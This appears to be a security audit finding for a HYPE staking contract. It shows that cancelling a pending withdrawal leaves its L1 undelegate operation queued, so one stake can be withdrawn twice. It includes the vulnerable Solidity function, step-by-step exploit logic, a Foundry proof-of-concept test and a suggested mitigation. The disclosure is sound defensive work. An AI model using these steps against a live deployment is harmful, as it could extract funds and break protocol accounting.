  "body": "## Finding description and impact\n\nSummary\nA vulnerability exists in the StakingManager contract if withdrawals are cancelled when they are still pending processing on L1. This introduces the possibility that a user can trigger multiple L1 withdrawal operations for the same stake, potentially withdrawing more HYPE than was originally deposited and breaking protocol accounting.\n\nDetailed Description\nWhen a user queues a withdrawal, the StakingManager queues an L1 operation to withdraw HYPE from validators. Critically, If this withdrawal is later cancelled BEFORE calling processL1Withdrawals, the withdrawal request is deleted on L2(StakingManager), but the corresponding L1 operation to undelegate to staker remains in the queue. This can lead to a desynchronization between L2 state and L1 states.\n\nTo see how, let's examine the relevant code in the cancelWithdrawal function:\n\n````\nfunction cancelWithdrawal(address user, uint256 withdrawalId) external onlyRole(MANAGER_ROLE) whenNotPaused {\n    WithdrawalRequest storage request = _withdrawalRequests[user][withdrawalId];\n    require(request.hypeAmount > 0, \"No such withdrawal request\");\n\n    uint256 hypeAmount = request.hypeAmount;\n    uint256 kHYPEAmount = request.kHYPEAmount;\n    uint256 kHYPEFee = request.kHYPEFee;\n\n    // Clear the withdrawal request\n    delete _withdrawalRequests[user][withdrawalId];\n    totalQueuedWithdrawals -= hypeAmount;\n\n    // Return kHYPE tokens to user (including fees)\n    kHYPE.transfer(user, kHYPEAmount + kHYPEFee);\n\n    // Track cancelled amount for future redelegation\n    _cancelledWithdrawalAmount += hypeAmount;\n\n    emit WithdrawalCancelled(user, withdrawalId, hypeAmount, _cancelledWithdrawalAmount);\n}\n````\n\nNotice that this function only updates L2 state by removing the withdrawal request and returning kHYPE tokens to the user. However, it does not have a mechanism to know whether the undelegate request is still queued.\n\nHence, When the operator later processes the L1 operations queue with processL1Operations, all operations including those from cancelled withdrawals will be executed.\n\n\nThis vulnerability then can be demonstrated as follows:\n\n1. User stakes 1 ETH, receiving 1 kHYPE.\n2. User queues withdrawal (L1 Undelegate Command #1 added to queue).\n3. Withdrawal gets cancelled by manager for some reason (but L1 Command #1 remains in queue), but importantly, before all pending withdrawals(including the cancelled one) are processed via processL1Withdrawals.\n4. User instantly queues another withdrawal with the same kHYPE he got back from cancellation (L1 Command #2 added to queue).\n5. Both Command #1 and Command #2 finally get processed by calling processL1Operations.\n6. Result: 2 ETH withdrawn from validator when only 1 ETH was staked creating an accounting inconsistency.\n\n## Recommended mitigation steps\n\nOne potential mitigation is to remove the cancelled withdrawal undelegation from the _pendingWithdrawals array if it exists, and hence removing it from processing.\n\nPlease note that this is only a recommended mitigation and might not align with design intent of protocol. If not then other approaches might need to be considered.",
  "proof_of_concept": "Add this test to StakingManager.t.sol file: \n\n    function test_DoubleWithdrawalViaCancelledRequest() public {\n        uint256 stakeAmount = 1 ether;\n        \n        // --- Calculate Expected Post-Fee Amount (8 Decimals) ---\n        uint256 feeRate = stakingManager.unstakeFeeRate(); // Default 10\n        uint256 basisPoints = stakingManager.BASIS_POINTS(); // 10000\n        // Calculate fee on the kHYPE amount (18 decimals)\n        uint256 kHYPEFee = (stakeAmount * feeRate) / basisPoints;\n        uint256 postFeeKHYPE = stakeAmount - kHYPEFee;\n        // Convert post-fee kHYPE to HYPE (assuming 1:1 for this calculation)\n        uint256 expectedHypeAmount18Dec = postFeeKHYPE;\n        // Convert expected HYPE to 8 decimals (same logic as _convertTo8Decimals)\n        uint256 expectedAmount8Dec = expectedHypeAmount18Dec / 1e10;\n        // Explicitly check the value we derived\n        assertEq(expectedAmount8Dec, 99900000, \"Calculated 8 dec amount mismatch\"); \n\n        // --- Setup ---\n        // 1. Activate validator and set delegation for StakingManager\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        stakingManager.setTargetBuffer(0); \n        vm.stopPrank();\n\n        // --- Actions ---\n        // 2. User stakes 1 ETH\n        vm.deal(user, stakeAmount);\n        vm.prank(user);\n        stakingManager.stake{value: stakeAmount}();\n        uint256 kHYPEBalance = kHYPE.balanceOf(user); \n\n        // 3. User queues Withdrawal #1 (ID 0)\n        vm.startPrank(user);\n        kHYPE.approve(address(stakingManager), kHYPEBalance);\n        stakingManager.queueWithdrawal(kHYPEBalance);\n        vm.stopPrank();\n\n        // 4. Manager cancels Withdrawal #1 (ID 0)\n        vm.prank(manager);\n        stakingManager.cancelWithdrawal(user, 0);\n        // Alice gets kHYPE back here\n\n        // 5. User queues Withdrawal #2 (ID 1) using the kHYPE returned from cancellation\n        vm.startPrank(user);\n        // Re-approve just in case allowance was exact\n        kHYPE.approve(address(stakingManager), kHYPEBalance); \n        stakingManager.queueWithdrawal(kHYPEBalance);\n        vm.stopPrank();\n\n        // --- Verification: Process L1 Ops & Expect Double Event with CORRECT Amount ---\n        // 6. Expect L1 operation for the *cancelled* withdrawal (ID 0)\n        vm.expectEmit(true, true, false, true);\n        emit IStakingManager.L1DelegationProcessed(\n            address(stakingManager),\n            validator, \n            expectedAmount8Dec, // Use the calculated post-fee 8-decimal amount\n            IStakingManager.OperationType.UserWithdrawal\n        );\n\n        // 7. Expect L1 operation for the *active* withdrawal (ID 1)\n        vm.expectEmit(true, true, false, true);\n        emit IStakingManager.L1DelegationProcessed(\n            address(stakingManager),\n            validator, \n            expectedAmount8Dec, // Use the calculated post-fee 8-decimal amount\n            IStakingManager.OperationType.UserWithdrawal\n        );\n\n        // 8. Trigger processing of the L1 queue\n        vm.prank(operator);\n        stakingManager.processL1Operations(0); // Process all pending\n    }\n\nIt should pass showing a double withdrawal.",
